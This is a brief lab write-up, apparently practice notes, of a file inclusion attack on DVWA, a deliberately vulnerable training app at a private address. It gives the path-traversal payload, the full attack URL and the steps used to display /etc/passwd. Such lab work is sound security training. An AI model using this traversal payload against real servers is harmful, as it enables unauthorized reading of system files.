# File Inclusion

## Payload Used

```text
../../../../../etc/passwd
```

## Full URL

```text
http://192.168.89.131/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
```

## Description

File Inclusion vulnerability allows attackers to access sensitive files from the server.

## Steps

1. Open DVWA
2. Navigate to File Inclusion
3. Modify URL parameter:
   ```text
   ../../../../../etc/passwd
   ```
4. Sensitive system file was displayed

## Result

Successfully accessed `/etc/passwd` file.

## Screenshots
